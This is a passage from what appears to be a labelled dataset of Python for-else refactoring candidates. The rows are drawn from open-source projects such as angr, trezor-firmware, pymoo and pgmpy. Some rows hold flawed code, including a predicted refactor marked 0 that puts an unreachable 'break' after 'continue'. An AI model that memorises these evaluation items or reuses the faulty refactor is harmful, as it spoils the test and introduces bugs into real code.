            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
mdetr,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/mdetr/datasets/phrasecut_utils/subset.py,https://github.com/ashkamath/mdetr/tree/master/datasets/phrasecut_utils/subset.py,PhraseCutSubsets,get_subset$124,"def get_subset(self, image_id, phrase_structure, gt_boxes, gt_relative_size):
        cond = dict()
        for key in subsets:
            cond[key] = False
        cond[""all""] = True

        # # people
        # cond['people'] = False
        # for name in people_names:
        #     if name in phrase:
        #         cond['people'] = True
        #         break
        # cond['non_people'] = not cond['people']

        # top_k: ICCV submission
        # top_k = 501  # top_k starts from 0
        # for ni, name in enumerate(vg500_names):
        #     if name in phrase:
        #         top_k = ni
        #         break

        # d_cocotv: coco trainval or not
        if image_id in self.not_coco_trainval:
            cond[""d_notcocotv""] = True
        else:
            cond[""d_cocotv""] = True

        # c_coco
        if phrase_structure[""name""] in coco:
            cond[""c_coco""] = True

        # cat freq ranking
        cat_topk = 501
        if phrase_structure[""name""] in self.cat_sorted:
            cat_topk = self.cat_sorted.index(phrase_structure[""name""])

        if cat_topk < 20:
            cond[""c20""] = True
        elif cat_topk < 100:
            cond[""c21-100""] = True
        elif cat_topk < 500:
            cond[""c101-500""] = True
        else:
            cond[""c500+""] = True

        if cat_topk < 100:
            cond[""c100""] = True
        if cat_topk < 500:
            cond[""c500""] = True

        # att freq ranking
        att_topk = 201
        for att in phrase_structure[""attributes""]:
            if att in self.att_sorted:
                att_topk = min(self.att_sorted.index(att), att_topk)

        if att_topk < 20:
            cond[""a20""] = True
        elif att_topk < 100:
            cond[""a21-100""] = True
        elif att_topk < 200:
            cond[""a101-200""] = True
        else:
            cond[""a200+""] = True

        if att_topk < 100:
            cond[""a100""] = True
        if att_topk < 200:
            cond[""a200""] = True

        # phrase mode
        if phrase_structure:
            if len(phrase_structure[""attributes""]) > 0:
                cond[""p_att""] = True
            if len(phrase_structure[""attributes""]) > 1:
                cond[""p_attm""] = True
            if len(phrase_structure[""relation_descriptions""]) > 0:
                cond[""p_rel""] = True
            if len(phrase_structure[""relation_descriptions""]) > 1:
                cond[""p_relm""] = True
            if len(phrase_structure[""attributes""]) > 0 and len(phrase_structure[""relation_descriptions""]) > 0:
                cond[""p_att_rel""] = True

            if phrase_structure[""type""] == ""name"":
                cond[""p_name""] = True
            if phrase_structure[""type""] == ""attribute"":
                cond[""p_att+""] = True
            if phrase_structure[""type""] == ""relation"":
                cond[""p_rel+""] = True
            if phrase_structure[""type""] == ""verbose"":
                cond[""p_verbose""] = True

        # instance count
        if len(gt_boxes) == 1:
            cond[""i_single""] = True
        elif 5 > len(gt_boxes) > 1:
            cond[""i_multi""] = True
        elif len(gt_boxes) >= 5:
            cond[""i_many""] = True

        # gt size
        if gt_relative_size < 0.02:
            cond[""s_small""] = True
        elif gt_relative_size > 0.2:
            cond[""s_large""] = True
        else:
            cond[""s_mid""] = True

        # stuff or not
        is_stuff = False
        for name in stuff_names:
            # if name in phrase:  # iccv submission
            if name in phrase_structure[""name""]:
                is_stuff = True
                break
        if is_stuff:
            cond[""t_stuff""] = True
        else:
            cond[""t_obj""] = True

        # att type
        if phrase_structure:
            if phrase_structure[""attributes""]:
                for att in phrase_structure[""attributes""]:
                    if att in att_color:
                        cond[""a_color""] = True
                    if att in att_shape:
                        cond[""a_shape""] = True
                    if att in att_material:
                        cond[""a_material""] = True
                    if att in att_texture:
                        cond[""a_texture""] = True
                    if att in att_state:
                        cond[""a_state""] = True
                    if att in att_adj:
                        cond[""a_adj""] = True
                    if att in att_noun:
                        cond[""a_noun""] = True
                    if att in att_loc:
                        cond[""a_loc""] = True
                    if att in att_count:
                        cond[""a_count""] = True
                    if att in att_bad:
                        cond[""a_bad""] = True
        return cond","for name in stuff_names:
    if name in phrase_structure['name']:
        is_stuff = True
        break
if is_stuff:
    cond['t_stuff'] = True
else:
    cond['t_obj'] = True","for name in stuff_names:
    if name in phrase_structure['name']:
        cond['t_stuff'] = True
        break
else:
    cond['t_obj'] = True","for name in stuff_names:
    if name in phrase_structure['name']:
        cond['t_stuff'] = True
        break
else:
    cond['t_obj'] = True",1,"for name in stuff_names:
    if name in phrase_structure['name']:
        is_stuff = True
        break
if is_stuff:
    cond['t_stuff'] = True
else:
    cond['t_obj'] = True","break statement is executed:zejun1
break statement is not executed:None"
angr,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/angr/angr/analyses/cfg/indirect_jump_resolvers/const_resolver.py,https://github.com/angr/angr/tree/master/angr/analyses/cfg/indirect_jump_resolvers/const_resolver.py,,exists_in_replacements$13,"def exists_in_replacements(replacements, block_loc, tmp_var):
    exists = False
    for rep in replacements:
        if rep == block_loc:
            exists = True
            break

    if not exists:
        return False

    exists = False
    for var in replacements[block_loc]:
        if var == tmp_var:
            exists = True
            break

    return exists","for rep in replacements:
    if rep == block_loc:
        exists = True
        break
if not exists:
    return False","for rep in replacements:
    if rep == block_loc:
        exists = True
        break
else:
    return False","for rep in replacements:
    if rep == block_loc:
        exists = True
        break
else:
    return False",1,"for rep in replacements:
    if rep == block_loc:
        exists = True
        break
if not exists:
    return False","break statement is executed:None
break statement is not executed:zejun1"
bunkerized-nginx,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/bunkerized-nginx/autoconf/src/Config.py,https://github.com/bunkerity/bunkerized-nginx/tree/master/autoconf/src/Config.py,Config,__wait_docker$117,"def __wait_docker(self, instances) :
		all_healthy = False
		i = 0
		while i < 120 :
			one_not_healthy = False
			for instance in instances :
				instance.reload()
				if instance.attrs[""State""][""Health""][""Status""] != ""healthy"" :
					one_not_healthy = True
					break
			if not one_not_healthy :
				all_healthy = True
				break
			time.sleep(1)
			i += 1
		return all_healthy","for instance in instances:
    instance.reload()
    if instance.attrs['State']['Health']['Status'] != 'healthy':
        one_not_healthy = True
        break
if not one_not_healthy:
    all_healthy = True
    break","for instance in instances:
    instance.reload()
    if instance.attrs['State']['Health']['Status'] != 'healthy':
        break
else:
    all_healthy = True
    break","for instance in instances:
    instance.reload()
    if instance.attrs['State']['Health']['Status'] != 'healthy':
        break
else:
    all_healthy = True
    break",1,"for instance in instances:
    instance.reload()
    if instance.attrs['State']['Health']['Status'] != 'healthy':
        one_not_healthy = True
        break
if not one_not_healthy:
    all_healthy = True
    break","break statement is executed:None
break statement is not executed:zejun1"
graph-generation,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/graph-generation/data.py,https://github.com/JiaxuanYou/graph-generation/tree/master//data.py,Graph_sequence_sampler_pytorch_nll,calc_adj$623,"def calc_adj(self,adj):
        max_iter = 10000
        adj_all = [adj]
        adj_all_len = 1
        i_old = 0
        for i in range(max_iter):
            adj_copy = adj.copy()
            x_idx = np.random.permutation(adj_copy.shape[0])
            adj_copy = adj_copy[np.ix_(x_idx, x_idx)]
            adj_copy_matrix = np.asmatrix(adj_copy)
            G = nx.from_numpy_matrix(adj_copy_matrix)
            # then do bfs in the permuted G
            start_idx = np.random.randint(adj_copy.shape[0])
            x_idx = np.array(bfs_seq(G, start_idx))
            adj_copy = adj_copy[np.ix_(x_idx, x_idx)]
            add_flag = True
            for adj_exist in adj_all:
                if np.array_equal(adj_exist, adj_copy):
                    add_flag = False
                    break
            if add_flag:
                adj_all.append(adj_copy)
                adj_all_len += 1
            if adj_all_len % 10 ==0:
                print('adj found:',adj_all_len,'iter used',i)
        return adj_all","for adj_exist in adj_all:
    if np.array_equal(adj_exist, adj_copy):
        add_flag = False
        break
if add_flag:
    adj_all.append(adj_copy)
    adj_all_len += 1","for adj_exist in adj_all:
    if np.array_equal(adj_exist, adj_copy):
        break
else:
    adj_all.append(adj_copy)
    adj_all_len += 1","for adj_exist in adj_all:
    if np.array_equal(adj_exist, adj_copy):
        break
else:
    adj_all.append(adj_copy)
    adj_all_len += 1",1,"for adj_exist in adj_all:
    if np.array_equal(adj_exist, adj_copy):
        add_flag = False
        break
if add_flag:
    adj_all.append(adj_copy)
    adj_all_len += 1","break statement is executed:None
break statement is not executed:zejun1"
trezor-firmware,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/trezor-firmware/core/src/apps/monero/signing/step_01_init_transaction.py,https://github.com/trezor/trezor-firmware/tree/master/core/src/apps/monero/signing/step_01_init_transaction.py,,_check_change$237,"def _check_change(
    state: State, outputs: list[MoneroTransactionDestinationEntry]
) -> None:
    """"""
    Check if the change address in state.output_change (from `tsx_data.outputs`) is
    a) among tx outputs
    b) is equal to our address

    The change output is in `tsx_data.change_dts`, but also has to be in `tsx_data.outputs`.
    This is what Monero does in its cold wallet signing protocol.

    In other words, these structures are built by Monero when generating unsigned transaction set
    and we do not want to modify this logic. We just translate the unsigned tx to the protobuf message.

    So, although we could probably optimize this by having the change output in `change_dts`
    only, we intentionally do not do so.
    """"""
    from apps.monero.xmr.addresses import addr_eq, get_change_addr_idx

    change_index = get_change_addr_idx(outputs, state.output_change)

    change_addr = state.change_address()
    # if there is no change, there is nothing to check
    if change_addr is None:
        state.mem_trace(""No change"" if __debug__ else None)
        return

    # Sweep tx is just one output and no change.
    # To prevent recognition of such transactions another fake output is added
    # that spends exactly 0 coins to a random address.
    # See https://github.com/monero-project/monero/pull/1415
    if change_index is None and state.output_change.amount == 0 and len(outputs) == 2:
        state.mem_trace(""Sweep tsx"" if __debug__ else None)
        return

    found = False
    for out in outputs:
        if addr_eq(out.addr, change_addr):
            found = True
            break

    if not found:
        raise signing.ChangeAddressError(""Change address not found in outputs"")

    my_addr = _get_primary_change_address(state)
    if not addr_eq(my_addr, change_addr):
        raise signing.ChangeAddressError(""Change address differs from ours"")","for out in outputs:
    if addr_eq(out.addr, change_addr):
        found = True
        break
if not found:
    raise signing.ChangeAddressError('Change address not found in outputs')","for out in outputs:
    if addr_eq(out.addr, change_addr):
        break
else:
    raise signing.ChangeAddressError('Change address not found in outputs')","for out in outputs:
    if addr_eq(out.addr, change_addr):
        break
else:
    raise signing.ChangeAddressError('Change address not found in outputs')",1,"for out in outputs:
    if addr_eq(out.addr, change_addr):
        found = True
        break
if not found:
    raise signing.ChangeAddressError('Change address not found in outputs')","break statement is executed:None
break statement is not executed:zejun1"
pymoo,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pymoo/pymoo/util/nds/naive_non_dominated_sort.py,https://github.com/anyoptimization/pymoo/tree/master/pymoo/util/nds/naive_non_dominated_sort.py,,naive_non_dominated_sort$4,"def naive_non_dominated_sort(F, **kwargs):
    M = Dominator.calc_domination_matrix(F)

    fronts = []
    remaining = set(range(M.shape[0]))

    while len(remaining) > 0:

        front = []

        for i in remaining:

            is_dominated = False
            dominating = set()

            for j in front:
                rel = M[i, j]
                if rel == 1:
                    dominating.add(j)
                elif rel == -1:
                    is_dominated = True
                    break

            if is_dominated:
                continue
            else:
                front = [x for x in front if x not in dominating]
                front.append(i)

        [remaining.remove(e) for e in front]
        fronts.append(front)

    return fronts","for j in front:
    rel = M[i, j]
    if rel == 1:
        dominating.add(j)
    elif rel == -1:
        is_dominated = True
        break
if is_dominated:
    continue
else:
    front = [x for x in front if x not in dominating]
    front.append(i)","for j in front:
    rel = M[i, j]
    if rel == 1:
        dominating.add(j)
    elif rel == -1:
        is_dominated = True
        break
else:
    front = [x for x in front if x not in dominating]
    front.append(i)","for j in front:
    rel = M[i, j]
    if rel == 1:
        dominating.add(j)
    elif rel == -1:
        continue
        break
else:
    front = [x for x in front if x not in dominating]
    front.append(i)",0,"for j in front:
    rel = M[i, j]
    if rel == 1:
        dominating.add(j)
    elif rel == -1:
        is_dominated = True
        break
if is_dominated:
    continue
else:
    front = [x for x in front if x not in dominating]
    front.append(i)","break statement is executed:zejun1
break statement is not executed:None"
docassemble,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/docassemble/docassemble_base/docassemble/base/core.py,https://github.com/jhpyle/docassemble/tree/master/docassemble_base/docassemble/base/core.py,DASet,filter$2873,"def filter(self, *pargs, **kwargs):
        """"""Returns a filtered version of the set containing only items with particular values of attributes.""""""
        self._trigger_gather()
        new_elements = set()
        for item in self.elements:
            include = True
            for key, val in kwargs.items():
                if getattr(item, key) != val:
                    include = False
                    break
            if include:
                new_elements.add(item)
        if len(pargs):
            new_instance_name = pargs[0]
        else:
            new_instance_name = self.instanceName
        new_set = self.copy_shallow(new_instance_name)
        new_set.elements = new_elements
        new_list.gathered = True
        if len(new_list.elements) == 0:
            new_list.there_are_any = False
        return new_set","for (key, val) in kwargs.items():
    if getattr(item, key) != val:
        include = False
        break
if include:
    new_elements.add(item)","for (key, val) in kwargs.items():
    if getattr(item, key) != val:
        break
else:
    new_elements.add(item)","for (key, val) in kwargs.items():
    if getattr(item, key) != val:
        break
else:
    new_elements.add(item)",1,"for (key, val) in kwargs.items():
    if getattr(item, key) != val:
        include = False
        break
if include:
    new_elements.add(item)","break statement is executed:None
break statement is not executed:zejun1"
pgmpy,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/pgmpy/pgmpy/base/DAG.py,https://github.com/pgmpy/pgmpy/tree/master/pgmpy/base/DAG.py,PDAG,to_dag$1129,"def to_dag(self, required_edges=[]):
        """"""
        Returns one possible DAG which is represented using the PDAG.

        Parameters
        ----------
        required_edges: list, array-like of 2-tuples
            The list of edges that should be included in the DAG.

        Returns
        -------
        Returns an instance of DAG.

        Examples
        --------

        """"""
        # Add required edges if it doesn't form a new v-structure or an opposite edge
        # is already present in the network.
        dag = DAG()
        # Add all the nodes and the directed edges
        dag.add_nodes_from(self.nodes())
        dag.add_edges_from(self.directed_edges)
        dag.latents = self.latents

        pdag = self.copy()
        while pdag.number_of_nodes() > 0:
            # find node with (1) no directed outgoing edges and
            #                (2) the set of undirecte neighbors is either empty or
            #                    undirected neighbors + parents of X are a clique
            found = False
            for X in pdag.nodes():
                directed_outgoing_edges = set(pdag.successors(X)) - set(
                    pdag.predecessors(X)
                )
                undirected_neighbors = set(pdag.successors(X)) & set(
                    pdag.predecessors(X)
                )
                neighbors_are_clique = all(
                    (
                        pdag.has_edge(Y, Z)
                        for Z in pdag.predecessors(X)
                        for Y in undirected_neighbors
                        if not Y == Z
                    )
                )

                if not directed_outgoing_edges and (
                    not undirected_neighbors or neighbors_are_clique
                ):
                    found = True
                    # add all edges of X as outgoing edges to dag
                    for Y in pdag.predecessors(X):
                        dag.add_edge(Y, X)
                    pdag.remove_node(X)
                    break

            if not found:
                warn(
                    ""PDAG has no faithful extension (= no oriented DAG with the ""
                    + ""same v-structures as PDAG). Remaining undirected PDAG edges ""
                    + ""oriented arbitrarily.""
                )
                for X, Y in pdag.edges():
                    if not dag.has_edge(Y, X):
                        try:
                            dag.add_edge(X, Y)
                        except ValueError:
                            pass
                break
        return dag","for X in pdag.nodes():
    directed_outgoing_edges = set(pdag.successors(X)) - set(pdag.predecessors(X))
    undirected_neighbors = set(pdag.successors(X)) & set(pdag.predecessors(X))
    neighbors_are_clique = all((pdag.has_edge(Y, Z) for Z in pdag.predecessors(X) for Y in undirected_neighbors if not Y == Z))
    if not directed_outgoing_edges and (not undirected_neighbors or neighbors_are_clique):
        found = True
        for Y in pdag.predecessors(X):
            dag.add_edge(Y, X)
        pdag.remove_node(X)
        break
if not found:
    warn('PDAG has no faithful extension (= no oriented DAG with the ' + 'same v-structures as PDAG). Remaining undirected PDAG edges ' + 'oriented arbitrarily.')
    for (X, Y) in pdag.edges():
        if not dag.has_edge(Y, X):
            try:
                dag.add_edge(X, Y)
            except ValueError:
                pass
    break","for X in pdag.nodes():
    directed_outgoing_edges = set(pdag.successors(X)) - set(pdag.predecessors(X))
    undirected_neighbors = set(pdag.successors(X)) & set(pdag.predecessors(X))
    neighbors_are_clique = all((pdag.has_edge(Y, Z) for Z in pdag.predecessors(X) for Y in undirected_neighbors if not Y == Z))
    if not directed_outgoing_edges and (not undirected_neighbors or neighbors_are_clique):
        for Y in pdag.predecessors(X):
            dag.add_edge(Y, X)
        pdag.remove_node(X)
        break
else:
    warn('PDAG has no faithful extension (= no oriented DAG with the ' + 'same v-structures as PDAG). Remaining undirected PDAG edges ' + 'oriented arbitrarily.')
    for (X, Y) in pdag.edges():
        if not dag.has_edge(Y, X):
            try:
                dag.add_edge(X, Y)
            except ValueError:
                pass
    break","for X in pdag.nodes():
    directed_outgoing_edges = set(pdag.successors(X)) - set(pdag.predecessors(X))
    undirected_neighbors = set(pdag.successors(X)) & set(pdag.predecessors(X))
    neighbors_are_clique = all((pdag.has_edge(Y, Z) for Z in pdag.predecessors(X) for Y in undirected_neighbors if not Y == Z))
    if not directed_outgoing_edges and (not undirected_neighbors or neighbors_are_clique):
        for Y in pdag.predecessors(X):
            dag.add_edge(Y, X)
        pdag.remove_node(X)
        break
else:
    warn('PDAG has no faithful extension (= no oriented DAG with the ' + 'same v-structures as PDAG). Remaining undirected PDAG edges ' + 'oriented arbitrarily.')
    for (X, Y) in pdag.edges():
        if not dag.has_edge(Y, X):
            try:
                dag.add_edge(X, Y)
            except ValueError:
                pass
    break",1,"for X in pdag.nodes():
    directed_outgoing_edges = set(pdag.successors(X)) - set(pdag.predecessors(X))
    undirected_neighbors = set(pdag.successors(X)) & set(pdag.predecessors(X))
    neighbors_are_clique = all((pdag.has_edge(Y, Z) for Z in pdag.predecessors(X) for Y in undirected_neighbors if not Y == Z))
    if not directed_outgoing_edges and (not undirected_neighbors or neighbors_are_clique):
        found = True
        for Y in pdag.predecessors(X):
            dag.add_edge(Y, X)
        pdag.remove_node(X)
        break
if not found:
    warn('PDAG has no faithful extension (= no oriented DAG with the ' + 'same v-structures as PDAG). Remaining undirected PDAG edges ' + 'oriented arbitrarily.')
    for (X, Y) in pdag.edges():
        if not dag.has_edge(Y, X):
            try:
                dag.add_edge(X, Y)
            except ValueError:
                pass
    break","break statement is executed:None
break statement is not executed:zejun1"
mars,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/mars/mars/tensor/base/psrs.py,https://github.com/mars-project/mars/tree/master/mars/tensor/base/psrs.py,PSRSOperandMixin,preprocess$44,"def preprocess(cls, op, in_data=None):
        if in_data is None:
            in_data = op.inputs[0]
        axis_shape = in_data.shape[op.axis]
        axis_chunk_shape = in_data.chunk_shape[op.axis]

        # rechunk to ensure all chunks on axis have rough same size
        has_unknown_shape = False
        for ns in in_data.nsplits:
            if any(np.isnan(s) for s in ns):
                has_unknown_shape = True
                break

        if not has_unknown_shape:
            axis_chunk_shape = min(axis_chunk_shape, int(np.sqrt(axis_shape)))
            if np.isnan(axis_shape) or any(
                np.isnan(s) for s in in_data.nsplits[op.axis]
            ):
                yield
            chunk_size = int(axis_shape / axis_chunk_shape)
            chunk_sizes = [chunk_size for _ in range(int(axis_shape // chunk_size))]
            if axis_shape % chunk_size > 0:
                chunk_sizes[-1] += axis_shape % chunk_size
            in_data = yield from recursive_tile(
                in_data.rechunk({op.axis: tuple(chunk_sizes)})
            )
            axis_chunk_shape = in_data.chunk_shape[op.axis]

        left_chunk_shape = (
            in_data.chunk_shape[: op.axis] + in_data.chunk_shape[op.axis + 1 :]
        )
        if len(left_chunk_shape) > 0:
            out_idxes = itertools.product(*(range(s) for s in left_chunk_shape))
        else:
            out_idxes = [()]
        # if the size except axis has more than 1, the sorted values on each one may be different
        # another shuffle would be required to make sure each axis except to sort
        # has elements with identical size
        extra_shape = [s for i, s in enumerate(in_data.shape) if i != op.axis]
        if getattr(op, ""need_align"", None) is None:
            need_align = bool(np.prod(extra_shape, dtype=int) != 1)
        else:
            need_align = op.need_align

        return in_data, axis_chunk_shape, out_idxes, need_align","for ns in in_data.nsplits:
    if any((np.isnan(s) for s in ns)):
        has_unknown_shape = True
        break
if not has_unknown_shape:
    axis_chunk_shape = min(axis_chunk_shape, int(np.sqrt(axis_shape)))
    if np.isnan(axis_shape) or any((np.isnan(s) for s in in_data.nsplits[op.axis])):
        yield
    chunk_size = int(axis_shape / axis_chunk_shape)
    chunk_sizes = [chunk_size for _ in range(int(axis_shape // chunk_size))]
    if axis_shape % chunk_size > 0:
        chunk_sizes[-1] += axis_shape % chunk_size
    in_data = (yield from recursive_tile(in_data.rechunk({op.axis: tuple(chunk_sizes)})))
    axis_chunk_shape = in_data.chunk_shape[op.axis]","for ns in in_data.nsplits:
    if any((np.isnan(s) for s in ns)):
        break
else:
    axis_chunk_shape = min(axis_chunk_shape, int(np.sqrt(axis_shape)))
    if np.isnan(axis_shape) or any((np.isnan(s) for s in in_data.nsplits[op.axis])):
        yield
    chunk_size = int(axis_shape / axis_chunk_shape)
    chunk_sizes = [chunk_size for _ in range(int(axis_shape // chunk_size))]
    if axis_shape % chunk_size > 0:
        chunk_sizes[-1] += axis_shape % chunk_size
    in_data = (yield from recursive_tile(in_data.rechunk({op.axis: tuple(chunk_sizes)})))
    axis_chunk_shape = in_data.chunk_shape[op.axis]","for ns in in_data.nsplits:
    if any((np.isnan(s) for s in ns)):
        break
else:
    axis_chunk_shape = min(axis_chunk_shape, int(np.sqrt(axis_shape)))
    if np.isnan(axis_shape) or any((np.isnan(s) for s in in_data.nsplits[op.axis])):
        yield
    chunk_size = int(axis_shape / axis_chunk_shape)
    chunk_sizes = [chunk_size for _ in range(int(axis_shape // chunk_size))]
    if axis_shape % chunk_size > 0:
        chunk_sizes[-1] += axis_shape % chunk_size
    in_data = (yield from recursive_tile(in_data.rechunk({op.axis: tuple(chunk_sizes)})))
    axis_chunk_shape = in_data.chunk_shape[op.axis]",1,"for ns in in_data.nsplits:
    if any((np.isnan(s) for s in ns)):
        has_unknown_shape = True
        break
if not has_unknown_shape:
    axis_chunk_shape = min(axis_chunk_shape, int(np.sqrt(axis_shape)))
    if np.isnan(axis_shape) or any((np.isnan(s) for s in in_data.nsplits[op.axis])):
        yield
    chunk_size = int(axis_shape / axis_chunk_shape)
    chunk_sizes = [chunk_size for _ in range(int(axis_shape // chunk_size))]
    if axis_shape % chunk_size > 0:
        chunk_sizes[-1] += axis_shape % chunk_size
    in_data = (yield from recursive_tile(in_data.rechunk({op.axis: tuple(chunk_sizes)})))
    axis_chunk_shape = in_data.chunk_shape[op.axis]","break statement is executed:None
break statement is not executed:zejun1"
ChineseChess-AlphaZero,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ChineseChess-AlphaZero/cchess_alphazero/test.py,https://github.com/NeymarL/ChineseChess-AlphaZero/tree/master/cchess_alphazero/test.py,,fixbug$236,"def fixbug():
    from cchess_alphazero.config import Config
    from cchess_alphazero.lib.data_helper import get_game_data_filenames, read_game_data_from_file, write_game_data_to_file
    import cchess_alphazero.environment.static_env as senv
    c = Config('distribute')
    files = get_game_data_filenames(c.resource)
    cnt = 0
    fix = 0
    draw_cnt = 0
    for filename in files:
        try:
            data = read_game_data_from_file(filename)
        except:
            print(f""error: {filename}"")
            os.remove(filename)
            continue
        state = data[0]
        real_data = [state]
        need_fix = True
        draw = False
        action = None
        value = None
        is_red_turn = True
        for item in data[1:]:
            action = item[0]
            value = -item[1]
            if value == 0:
                need_fix = False
                draw = True
                draw_cnt += 1
                break
            state = senv.step(state, action)
            is_red_turn = not is_red_turn
            real_data.append([action, value])
        if not draw:
            game_over, v, final_move = senv.done(state)
            if final_move:
                v = -v
                is_red_turn = not is_red_turn
            if not is_red_turn:
                v = -v
            if not game_over:
                v = 1
            # print(game_over, v, final_move, state)
            if v == data[1][1]:
                need_fix = False
            else:
                need_fix = True
        if need_fix:
            write_game_data_to_file(filename, real_data)
            # print(filename)
            fix += 1
        cnt += 1
        if cnt % 1000 == 0:
            print(cnt, fix, draw_cnt)
    print(f""all {cnt}, fix {fix}, draw {draw_cnt}"")","for item in data[1:]:
    action = item[0]
    value = -item[1]
    if value == 0:
        need_fix = False
        draw = True
        draw_cnt += 1
        break
    state = senv.step(state, action)
    is_red_turn = not is_red_turn
    real_data.append([action, value])
if not draw:
    (game_over, v, final_move) = senv.done(state)
    if final_move:
        v = -v
        is_red_turn = not is_red_turn
    if not is_red_turn:
        v = -v
    if not game_over:
        v = 1
    if v == data[1][1]:
        need_fix = False
    else:
        need_fix = True","for item in data[1:]:
    action = item[0]
    value = -item[1]
    if value == 0:
        need_fix = False
        draw_cnt += 1
        break
    state = senv.step(state, action)
    is_red_turn = not is_red_turn
    real_data.append([action, value])
else:
    (game_over, v, final_move) = senv.done(state)
    if final_move:
        v = -v
        is_red_turn = not is_red_turn
    if not is_red_turn:
        v = -v
    if not game_over:
        v = 1
    if v == data[1][1]:
        need_fix = False
    else:
        need_fix = True","for item in data[1:]:
    action = item[0]
    value = -item[1]
    if value == 0:
        need_fix = False
        draw_cnt += 1
        break
    state = senv.step(state, action)
    is_red_turn = not is_red_turn
    real_data.append([action, value])
else:
    (game_over, v, final_move) = senv.done(state)
    if final_move:
        v = -v
        is_red_turn = not is_red_turn
    if not is_red_turn:
        v = -v
    if not game_over:
        v = 1
    if v == data[1][1]:
        need_fix = False
    else:
        need_fix = True",1,"for item in data[1:]:
    action = item[0]
    value = -item[1]
    if value == 0:
        need_fix = False
        draw = True
        draw_cnt += 1
        break
    state = senv.step(state, action)
    is_red_turn = not is_red_turn
    real_data.append([action, value])
if not draw:
    (game_over, v, final_move) = senv.done(state)
    if final_move:
        v = -v
        is_red_turn = not is_red_turn
    if not is_red_turn:
        v = -v
    if not game_over:
        v = 1
    if v == data[1][1]:
        need_fix = False
    else:
        need_fix = True","break statement is executed:None
break statement is not executed:zejun1"
mega.pytorch,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/mega.pytorch/mega_core/data/datasets/evaluation/cityscapes/eval_instances.py,https://github.com/Scalsol/mega.pytorch/tree/master/mega_core/data/datasets/evaluation/cityscapes/eval_instances.py,,evaluateMaskMatches$619,"def evaluateMaskMatches(matches, args):
    # In the end, we need two vectors for each class and for each overlap
    # The first vector (y_true) is binary and is 1, where the ground truth says true,
    # and is 0 otherwise.
    # The second vector (y_score) is float [0...1] and represents the confidence of
    # the prediction.
    #
    # We represent the following cases as:
    #                                       | y_true |   y_score
    #   gt instance with matched prediction |    1   | confidence
    #   gt instance w/o  matched prediction |    1   |     0.0
    #          false positive prediction    |    0   | confidence
    #
    # The current implementation makes only sense for an overlap threshold >= 0.5,
    # since only then, a single prediction can either be ignored or matched, but
    # never both. Further, it can never match to two gt instances.
    # For matching, we vary the overlap and do the following steps:
    #   1.) remove all predictions that satisfy the overlap criterion with an ignore region (either void or *group)
    #   2.) remove matches that do not satisfy the overlap
    #   3.) mark non-matched predictions as false positive

    # AP
    overlaps = args.overlaps
    # region size
    minRegionSizes = args.minRegionSizes

    # only keep the first, if distances are not available
    # if not args.distanceAvailable:
    #     minRegionSizes = [ minRegionSizes[0] ]
    #     distThs        = [ distThs       [0] ]
    #     distConfs      = [ distConfs     [0] ]

    # Here we hold the results
    # First dimension is class, second overlap
    ap = np.zeros((len(minRegionSizes), len(args.instLabels), len(overlaps)), np.float)

    for dI, minRegionSize in enumerate(minRegionSizes):
        for (oI, overlapTh) in enumerate(overlaps):
            for (lI, labelName) in enumerate(args.instLabels):
                y_true = np.empty(0)
                y_score = np.empty(0)
                # count hard false negatives
                hardFns = 0
                # found at least one gt and predicted instance?
                haveGt = False
                havePred = False

                for img in matches:
                    predInstances = img[""prediction""][labelName]
                    gtInstances = img[""groundTruth""][labelName]
                    # filter groups in ground truth
                    gtInstances = [
                        gt for gt in gtInstances if gt[""pixelCount""] >= minRegionSize
                    ]

                    if gtInstances:
                        haveGt = True
                    if predInstances:
                        havePred = True

                    curTrue = np.ones(len(gtInstances))
                    curScore = np.ones(len(gtInstances)) * (-float(""inf""))
                    curMatch = np.zeros(len(gtInstances), dtype=np.bool)

                    # collect matches
                    for (gtI, gt) in enumerate(gtInstances):
                        foundMatch = False
                        for pred in gt[""matchedPred""]:
                            overlap = float(pred[""maskIntersection""]) / (
                                gt[""pixelCount""]
                                + pred[""pixelCount""]
                                - pred[""maskIntersection""]
                            )
                            if overlap > overlapTh:
                                # the score
                                confidence = pred[""confidence""]

                                # if we already hat a prediction for this groundtruth
                                # the prediction with the lower score is automatically a false positive
                                if curMatch[gtI]:
                                    maxScore = max(curScore[gtI], confidence)
                                    minScore = min(curScore[gtI], confidence)
                                    curScore[gtI] = maxScore
                                    # append false positive
                                    curTrue = np.append(curTrue, 0)
                                    curScore = np.append(curScore, minScore)
                                    curMatch = np.append(curMatch, True)
                                # otherwise set score
                                else:
                                    foundMatch = True
                                    curMatch[gtI] = True
                                    curScore[gtI] = confidence

                        if not foundMatch:
                            hardFns += 1

                    # remove non-matched ground truth instances
                    curTrue = curTrue[curMatch == True]
                    curScore = curScore[curMatch == True]

                    # collect non-matched predictions as false positive
